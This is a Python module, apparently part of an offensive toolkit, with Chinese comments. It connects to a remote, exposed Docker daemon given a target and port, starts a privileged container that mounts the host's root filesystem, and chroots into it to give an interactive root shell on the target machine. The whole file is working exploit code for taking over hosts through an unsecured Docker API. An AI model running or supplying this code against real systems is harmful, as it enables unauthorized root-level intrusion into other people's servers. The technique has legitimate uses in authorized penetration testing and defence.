#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
run_shell.py - Docker容器shell交互功能
"""

import subprocess
import sys


def run_shell(target, port, image_name="alpine"):
    """在远程Docker容器中执行交互式shell

    Args:
        target: 目标地址
        port: 端口号
        image_name: 镜像名称

    Returns:
        bool: 成功返回True，失败返回False
    """
    try:
        docker_host = f"{target}:{port}"

        # 检查镜像是否存在
        images_cmd = ["docker", "-H", docker_host, "images", "-q", image_name]
        images_result = subprocess.run(images_cmd, capture_output=True, text=True)

        if not images_result.stdout.strip():
            print(f"[-] 镜像 {image_name} 不存在")
            return False

        print(f"[+] 使用镜像: {image_name}")
        print(f"[+] Docker主机: {docker_host}")

        # 使用统一的命令构建函数
        def build_cmd(shell):
            return [
                "docker", "-H", docker_host,
                "run", "-it", "--rm", "--privileged",
                "-v", "/:/host",
                image_name, "chroot", "/host", shell
            ]

        shells = ["bash", "sh"]

        print("[+] 注意: 使用 Ctrl+P, Ctrl+Q 来退出容器而不停止它")
        print("[+] 使用 Ctrl+D 或输入 'exit' 来退出shell")
        print("[+] 正在尝试连接...")

        for shell in shells:
            print(f"\n[+] 尝试使用 {shell}...")
            cmd = build_cmd(shell)

            try:
                # 使用 subprocess.Popen 以获得更好的交互控制
                process = subprocess.Popen(
                    cmd,
                    stdin=sys.stdin,
                    stdout=sys.stdout,
                    stderr=sys.stderr,
                    text=True
                )

                # 等待进程完成
                process.wait()

                if process.returncode == 0:
                    print(f"\n[+] {shell} 执行成功，已退出")
                    return True
                else:
                    print(f"\n[-] {shell} 退出码: {process.returncode}")
                    if shell == shells[-1]:  # 如果是最后一个shell也失败了
                        print("[-] 所有shell尝试均失败")
                        return False
                    else:
                        print(f"[+] 尝试下一个shell...")

            except FileNotFoundError as e:
                print(f"[-] 命令执行失败，docker 命令未找到: {e}")
                return False
            except KeyboardInterrupt:
                print("\n[!] 操作被用户中断")
                try:
                    if process and process.poll() is None:
                        process.terminate()
                except:
                    pass
                return False
            except Exception as e:
                print(f"[-] 执行 {shell} 时出错: {e}")
                if shell == shells[-1]:
                    return False

    except KeyboardInterrupt:
        print("\n[!] 操作被用户中断")
        return False
    except Exception as e:
        print(f"[-] 执行shell出错: {str(e)}")
        return False